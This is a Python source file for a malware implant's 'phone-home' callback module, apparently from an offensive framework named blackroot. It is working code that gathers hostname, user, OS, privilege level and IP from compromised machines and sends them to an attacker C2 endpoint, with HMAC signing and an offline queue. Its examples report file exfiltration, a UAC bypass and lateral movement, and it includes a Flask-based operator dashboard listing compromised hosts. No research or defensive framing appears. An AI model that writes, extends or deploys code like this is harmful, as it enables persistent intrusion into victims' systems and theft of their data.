#!/usr/bin/env python3
"""
Phone-Home Callback System
==========================
Provides operator visibility into real-time agent activities including:
- New compromises (INITIAL callback)
- Lateral movements (LATERAL callback)
- Privilege escalations (ESCALATION callback)
- Agent health status (HEARTBEAT callback)
- Mission completion (MISSION_COMPLETE callback)

Features:
- HMAC-SHA256 signature for non-repudiation and spoofing prevention
- SQLite offline queue for C2 outages
- Rate limiting (HEARTBEAT max once/hour, others immediate)
- System information gathering
- Integration with C2ResilienceOrchestrator

Version: 1.0.0
"""

import hmac
import hashlib
import socket
import getpass
import platform
import sqlite3
import json
import os
import time
from enum import Enum
from datetime import datetime
from typing import Dict, Optional, List, Any


class CallbackType(Enum):
    """Callback types for different agent events."""
    INITIAL = "initial"          # New agent compromise
    LATERAL = "lateral"          # Network pivot discovered
    ESCALATION = "escalation"    # Privilege escalation successful
    HEARTBEAT = "heartbeat"      # Agent health status
    MISSION_COMPLETE = "mission_complete"  # Mission execution completed


class SystemInfo:
    """Gathers system information for callbacks."""
    
    @staticmethod
    def get_hostname() -> str:
        """Get system hostname."""
        try:
            return socket.gethostname()
        except Exception:
            return "unknown"
    
    @staticmethod
    def get_username() -> str:
        """Get current user."""
        try:
            return getpass.getuser()
        except Exception:
            return "unknown"
    
    @staticmethod
    def get_os_info() -> str:
        """Get OS info."""
        try:
            return platform.system()
        except Exception:
            return "unknown"
    
    @staticmethod
    def get_privilege_level() -> str:
        """Get privilege level (user/admin/system)."""
        try:
            is_admin = os.getuid() == 0 if hasattr(os, 'getuid') else False
            return "system" if is_admin else "admin"
        except Exception:
            return "user"
    
    @staticmethod
    def get_ipv4() -> str:
        """Get system IPv4 address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "0.0.0.0"


class PhoneHomeCallback:
    """
    Phone-Home Callback Manager
    
    Handles agent status reporting to C2 operator with:
    - HMAC-SHA256 signature for authenticity
    - Offline SQLite queue for C2 outages
    - Rate limiting (HEARTBEAT throttled to once/hour)
    - SystemInfo gathering
    
    Example:
        >>> callback = PhoneHomeCallback(
        ...     agent_id="agent_001",
        ...     c2_endpoint="https://operator.attacker.com:8443/callback",
        ...     shared_secret="secret_key_from_config"
        ... )
        >>> callback.send_callback(CallbackType.INITIAL, {"mission_ids": []})
    """
    
    # Rate limiting: Seconds between callbacks for same type
    RATE_LIMITS = {
        CallbackType.INITIAL: 0,           # Always send immediately
        CallbackType.LATERAL: 0,           # Always send immediately
        CallbackType.ESCALATION: 0,        # Always send immediately
        CallbackType.HEARTBEAT: 3600,      # Max once per hour
        CallbackType.MISSION_COMPLETE: 0,  # Always send immediately
    }
    
    def __init__(self, agent_id: str, c2_endpoint: str, shared_secret: str, 
                 queue_db: str = "phone_home_queue.db"):
        """
        Initialize phone-home callback manager.
        
        Args:
            agent_id: Unique agent identifier
            c2_endpoint: C2 callback endpoint URL (e.g., https://c2.attacker.com/callback)
            shared_secret: Shared secret for HMAC signing (from encrypted config)
            queue_db: Path to offline queue database
        """
        self.agent_id = agent_id
        self.c2_endpoint = c2_endpoint
        self.shared_secret = shared_secret
        self.queue_db = queue_db
        self.last_callback_time = {}  # Track last callback time per type
        
        # Initialize queue database
        self._init_queue_db()
    
    def _init_queue_db(self):
        """Initialize SQLite offline queue database."""
        try:
            conn = sqlite3.connect(self.queue_db)
            cursor = conn.cursor()
            
            # Create callbacks table if doesn't exist
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS callbacks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT NOT NULL,
                    callback_type TEXT NOT NULL,
                    payload TEXT NOT NULL,
                    signature TEXT NOT NULL,
                    timestamp REAL NOT NULL,
                    status TEXT DEFAULT 'pending',
                    retry_count INTEGER DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[!] Failed to initialize queue DB: {e}")
    
    def _build_payload(self, callback_type: CallbackType, 
                      metadata: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Build callback payload with system information.
        
        Args:
            callback_type: Type of callback (INITIAL, LATERAL, etc.)
            metadata: Additional metadata (mission ids, privilege level, etc.)
        
        Returns:
            Dictionary with callback payload
        """
        payload = {
            "agent_id": self.agent_id,
            "callback_type": callback_type.value,
            "timestamp": time.time(),
            "system_info": {
                "hostname": SystemInfo.get_hostname(),
                "username": SystemInfo.get_username(),
                "os": SystemInfo.get_os_info(),
                "privilege_level": SystemInfo.get_privilege_level(),
                "ipv4": SystemInfo.get_ipv4(),
            }
        }
        
        # Add metadata
        if metadata:
            payload["metadata"] = metadata
        
        return payload
    
    def _sign_payload(self, payload: Dict[str, Any]) -> str:
        """
        Sign payload with HMAC-SHA256.
        
        Args:
            payload: Callback payload dictionary
        
        Returns:
            HMAC-SHA256 signature as hex string
        """
        payload_str = json.dumps(payload, sort_keys=True)
        signature = hmac.new(
            self.shared_secret.encode(),
            payload_str.encode(),
            hashlib.sha256
        ).hexdigest()
        return signature
    
    def _should_rate_limit(self, callback_type: CallbackType) -> bool:
        """
        Check if callback is rate-limited.
        
        Args:
            callback_type: Type of callback to check
        
        Returns:
            True if rate-limited, False if should send
        """
        limit = self.RATE_LIMITS.get(callback_type, 0)
        
        if limit == 0:
            return False  # No rate limit
        
        last_time = self.last_callback_time.get(callback_type, 0)
        current_time = time.time()
        
        if (current_time - last_time) < limit:
            return True  # Rate limited
        
        return False
    
    def send_callback(self, callback_type: CallbackType, 
                     metadata: Optional[Dict[str, Any]] = None) -> bool:
        """
        Send callback to C2 endpoint.
        
        If C2 unreachable, queues callback for later delivery.
        
        Args:
            callback_type: Type of callback (INITIAL, LATERAL, etc.)
            metadata: Additional metadata
        
        Returns:
            True if sent successfully, False if queued offline
        """
        # Check rate limiting
        if self._should_rate_limit(callback_type):
            print(f"[*] Callback {callback_type.value} rate-limited, skipping")
            return True
        
        # Build and sign payload
        payload = self._build_payload(callback_type, metadata)
        signature = self._sign_payload(payload)
        
        # Try to send
        try:
            import requests
            headers = {
                "Content-Type": "application/json",
                "X-Agent-Signature": signature,
            }
            response = requests.post(
                self.c2_endpoint,
                json=payload,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                self.last_callback_time[callback_type] = time.time()
                print(f"[+] Callback {callback_type.value} sent successfully")
                return True
            else:
                print(f"[!] Callback failed: HTTP {response.status_code}, queuing offline")
                self._queue_callback(callback_type, payload, signature)
                return False
                
        except Exception as e:
            print(f"[!] Callback delivery failed ({e}), queuing offline")
            self._queue_callback(callback_type, payload, signature)
            return False
    
    def _queue_callback(self, callback_type: CallbackType, 
                       payload: Dict[str, Any], signature: str):
        """
        Queue callback to SQLite database for later delivery.
        
        Args:
            callback_type: Type of callback
            payload: Callback payload dictionary
            signature: HMAC-SHA256 signature
        """
        try:
            conn = sqlite3.connect(self.queue_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO callbacks 
                (agent_id, callback_type, payload, signature, timestamp, status)
                VALUES (?, ?, ?, ?, ?, 'pending')
            """, (
                self.agent_id,
                callback_type.value,
                json.dumps(payload),
                signature,
                time.time()
            ))
            
            conn.commit()
            conn.close()
            
            print(f"[+] Callback queued offline (queue depth: {self.queue_size()})")
            
        except Exception as e:
            print(f"[!] Failed to queue callback: {e}")
    
    def flush_offline_queue(self) -> int:
        """
        Attempt to deliver all queued callbacks.
        
        Returns:
            Number of callbacks successfully flushed
        """
        try:
            conn = sqlite3.connect(self.queue_db)
            cursor = conn.cursor()
            
            # Get all pending callbacks
            cursor.execute("""
                SELECT id, agent_id, callback_type, payload, signature, timestamp
                FROM callbacks
                WHERE status = 'pending'
                ORDER BY created_at ASC
                LIMIT 100
            """)
            
            callbacks = cursor.fetchall()
            flushed = 0
            
            for callback_id, agent_id, callback_type, payload_str, signature, timestamp in callbacks:
                try:
                    import requests
                    payload = json.loads(payload_str)
                    
                    headers = {
                        "Content-Type": "application/json",
                        "X-Agent-Signature": signature,
                    }
                    
                    response = requests.post(
                        self.c2_endpoint,
                        json=payload,
                        headers=headers,
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        # Mark as sent
                        cursor.execute(
                            "UPDATE callbacks SET status = 'sent' WHERE id = ?",
                            (callback_id,)
                        )
                        conn.commit()
                        flushed += 1
                        print(f"[+] Flushed callback {callback_id} ({callback_type})")
                    else:
                        # Retry later
                        cursor.execute(
                            "UPDATE callbacks SET retry_count = retry_count + 1 WHERE id = ?",
                            (callback_id,)
                        )
                        conn.commit()
                        
                except Exception as e:
                    print(f"[!] Failed to flush callback {callback_id}: {e}")
            
            conn.close()
            return flushed
            
        except Exception as e:
            print(f"[!] Failed to flush queue: {e}")
            return 0
    
    def queue_size(self) -> int:
        """
        Get number of pending callbacks in queue.
        
        Returns:
            Number of pending callbacks
        """
        try:
            conn = sqlite3.connect(self.queue_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT COUNT(*) FROM callbacks WHERE status = 'pending'")
            count = cursor.fetchone()[0]
            
            conn.close()
            return count
            
        except Exception:
            return 0
    
    def get_queue_stats(self) -> Dict[str, int]:
        """
        Get callback queue statistics.
        
        Returns:
            Dictionary with pending/sent/failed counts
        """
        try:
            conn = sqlite3.connect(self.queue_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT status, COUNT(*) FROM callbacks GROUP BY status
            """)
            
            stats = {}
            for status, count in cursor.fetchall():
                stats[status] = count
            
            conn.close()
            
            return {
                "pending": stats.get("pending", 0),
                "sent": stats.get("sent", 0),
                "failed": stats.get("failed", 0),
            }
            
        except Exception:
            return {"pending": 0, "sent": 0, "failed": 0}


# ============================================================================
# INTEGRATION EXAMPLES
# ============================================================================

def example_agent_initialization():
    """
    Example: Agent initialization with phone-home callbacks
    
    This would be in agents/base.py Phase 2 initialization.
    """
    # Load encrypted config
    from config_encryptor import ConfigEncryptor
    
    config_encryptor = ConfigEncryptor(deployment_id="deploy_001")
    encrypted_config = config_encryptor.load_encrypted_config("config.json.enc")
    decrypted_config = config_encryptor.decrypt_config(encrypted_config)
    
    # Initialize phone-home callback
    callback = PhoneHomeCallback(
        agent_id=decrypted_config["agent_id"],
        c2_endpoint=decrypted_config["c2_callback_endpoint"],
        shared_secret=decrypted_config["shared_secret"]
    )
    
    # Send INITIAL callback (new compromise)
    callback.send_callback(
        CallbackType.INITIAL,
        metadata={
            "agent_version": "4.2.1",
            "implant_type": "blackroot_agent",
            "parent_process": "svchost.exe",
            "parent_pid": 1234,
        }
    )
    
    return callback


def example_mission_completion():
    """
    Example: Send callback after mission completion
    
    This would be called by agents/base.py after mission execution.
    """
    callback = PhoneHomeCallback(
        agent_id="agent_001",
        c2_endpoint="https://operator.attacker.com:8443/callback",
        shared_secret="shared_secret_from_config"
    )
    
    # Send MISSION_COMPLETE callback
    callback.send_callback(
        CallbackType.MISSION_COMPLETE,
        metadata={
            "mission_id": "MISSION_001",
            "mission_type": "file_exfil",
            "status": "success",
            "bytes_exfilled": 5242880,  # 5MB
            "duration_seconds": 42,
        }
    )


def example_privilege_escalation():
    """
    Example: Send callback after privilege escalation
    
    This would be called by agents/base.py after privesc success.
    """
    callback = PhoneHomeCallback(
        agent_id="agent_001",
        c2_endpoint="https://operator.attacker.com:8443/callback",
        shared_secret="shared_secret_from_config"
    )
    
    # Send ESCALATION callback
    callback.send_callback(
        CallbackType.ESCALATION,
        metadata={
            "escalation_technique": "UAC_bypass_eventvwr",
            "from_privilege": "user",
            "to_privilege": "admin",
            "success": True,
        }
    )


def example_lateral_movement():
    """
    Example: Send callback on lateral movement
    
    This would be called by agents/base.py on network pivot.
    """
    callback = PhoneHomeCallback(
        agent_id="agent_001",
        c2_endpoint="https://operator.attacker.com:8443/callback",
        shared_secret="shared_secret_from_config"
    )
    
    # Send LATERAL callback
    callback.send_callback(
        CallbackType.LATERAL,
        metadata={
            "pivot_target": "192.168.1.50",
            "pivot_method": "psremoting",
            "target_hostname": "WORKSTATION_02",
            "target_user": "domain\\user",
        }
    )


def example_periodic_heartbeat(callback: PhoneHomeCallback):
    """
    Example: Send periodic heartbeat callback
    
    This would be called by agents/base.py tick() method.
    
    Args:
        callback: PhoneHomeCallback instance
    """
    # Heartbeat rate-limited to once per hour
    callback.send_callback(
        CallbackType.HEARTBEAT,
        metadata={
            "uptime_seconds": 3600,
            "missions_completed": 5,
            "last_mission_id": "MISSION_005",
            "next_beacon_seconds": 300,
        }
    )


def example_queue_flush(callback: PhoneHomeCallback):
    """
    Example: Flush offline queue when C2 reconnected
    
    This would be called by C2ResilienceOrchestrator on reconnection.
    
    Args:
        callback: PhoneHomeCallback instance
    """
    flushed = callback.flush_offline_queue()
    stats = callback.get_queue_stats()
    
    print(f"[+] Flushed {flushed} callbacks")
    print(f"    Pending: {stats['pending']}, Sent: {stats['sent']}, Failed: {stats['failed']}")


# ============================================================================
# C2 API ENDPOINT EXAMPLE
# ============================================================================

def c2_callback_endpoint_example():
    """
    Example: C2 API endpoint for receiving and verifying callbacks
    
    This would be in blackroot_c2_api.py
    
    Flask example:
        @app.route('/api/v1/agent/callback', methods=['POST'])
        def receive_callback():
            from phone_home_callback import PhoneHomeCallback
            import json
            
            try:
                # Get signature from header
                signature = request.headers.get('X-Agent-Signature')
                
                # Get payload
                payload = request.get_json()
                
                # Verify signature (need shared_secret from database)
                shared_secret = load_agent_shared_secret(payload['agent_id'])
                
                payload_str = json.dumps(payload, sort_keys=True)
                expected_sig = hmac.new(
                    shared_secret.encode(),
                    payload_str.encode(),
                    hashlib.sha256
                ).hexdigest()
                
                if signature != expected_sig:
                    return {"error": "invalid_signature"}, 401
                
                # Log callback
                agent_id = payload['agent_id']
                callback_type = payload['callback_type']
                system_info = payload['system_info']
                metadata = payload.get('metadata', {})
                
                # Update agent status in database
                agent = Agent.query.filter_by(agent_id=agent_id).first()
                if agent:
                    agent.last_callback = datetime.now()
                    agent.hostname = system_info['hostname']
                    agent.username = system_info['username']
                    agent.os = system_info['os']
                    agent.privilege_level = system_info['privilege_level']
                    agent.ipv4 = system_info['ipv4']
                    db.session.commit()
                    
                    # Alert operator for INITIAL callbacks
                    if callback_type == 'initial':
                        notify_operator(f"[!] NEW COMPROMISE: {agent_id} @ {system_info['hostname']}")
                
                return {"status": "ok"}, 200
                
            except Exception as e:
                return {"error": str(e)}, 500
    """
    pass


def operator_dashboard_example():
    """
    Example: Operator dashboard showing compromised hosts
    
    This would be in blackroot_c2_api.py
    
    Flask example:
        @app.route('/api/v1/dashboard/compromised-hosts', methods=['GET'])
        def compromised_hosts():
            agents = Agent.query.filter_by(active=True).order_by(Agent.last_callback.desc()).all()
            
            hosts = []
            for agent in agents:
                hosts.append({
                    "agent_id": agent.agent_id,
                    "hostname": agent.hostname,
                    "username": agent.username,
                    "os": agent.os,
                    "privilege_level": agent.privilege_level,
                    "ipv4": agent.ipv4,
                    "last_callback": agent.last_callback.isoformat(),
                    "missions_completed": agent.missions_completed,
                    "status": "online" if (datetime.now() - agent.last_callback).total_seconds() < 600 else "offline",
                })
            
            return {"hosts": hosts}, 200
    """
    pass


# ============================================================================
# REAL-TIME EXAMPLE: Agent Boot Sequence
# ============================================================================

def real_time_example_agent_boot():
    """
    Real-time example: What happens when agent boots
    
    T+0s: Agent starts
        - Load encrypted config
        - Decrypt C2 endpoint, DGA seed, shared secret
        - Initialize C2ResilienceOrchestrator
        - Initialize PhoneHomeCallback
    
    T+1s: Send INITIAL callback
        - Callback type: INITIAL
        - System info: hostname, username, OS, privilege level, IP
        - Metadata: agent version, implant type, parent process
        - Queue if offline, flush on reconnect
    
    T+5s: Operator alert
        - [!] NEW COMPROMISE: agent_001 @ WORKSTATION_02
        - Operator logs into dashboard, sees compromised host
        - Operator can now send missions
    
    T+300s (5 min): Periodic heartbeat
        - Callback type: HEARTBEAT
        - System info: uptime, missions completed, last mission
        - Rate limited to once/hour
    
    T+3600s (1 hour): Next heartbeat due
        - Rate limited, only one HEARTBEAT per hour
        - Other callbacks (ESCALATION, LATERAL, MISSION_COMPLETE) always send
    
    Example output:
        [*] Agent booting...
        [+] Config loaded and decrypted
        [+] Orchestrator initialized
        [+] Phone-home callback initialized
        [*] Sending INITIAL callback...
        [+] Callback INITIAL sent successfully
        
        [Operator sees on dashboard]:
        Compromised Hosts:
        - agent_001 @ WORKSTATION_02 (domain\\user)
          OS: Windows 10, Privilege: admin
          Last Callback: 2 seconds ago
          Status: ONLINE
    """
    pass


if __name__ == "__main__":
    print("[*] Phone-Home Callback System")
    print("[*] Import from agents/base.py or other modules")
    
    # Demo: Create callback manager
    callback = PhoneHomeCallback(
        agent_id="agent_demo",
        c2_endpoint="https://localhost:8443/callback",
        shared_secret="demo_secret"
    )
    
    print(f"\n[*] Callback initialized: {callback.agent_id}")
    print(f"[*] C2 Endpoint: {callback.c2_endpoint}")
    print(f"[*] Queue database: {callback.queue_db}")
    
    # Demo: Build payload
    payload = callback._build_payload(CallbackType.INITIAL)
    print(f"\n[*] Sample INITIAL payload:")
    print(json.dumps(payload, indent=2))
    
    # Demo: Sign payload
    signature = callback._sign_payload(payload)
    print(f"\n[*] Signature: {signature}")
    
    print("\n[*] Integration ready for agents/base.py Phase 2")
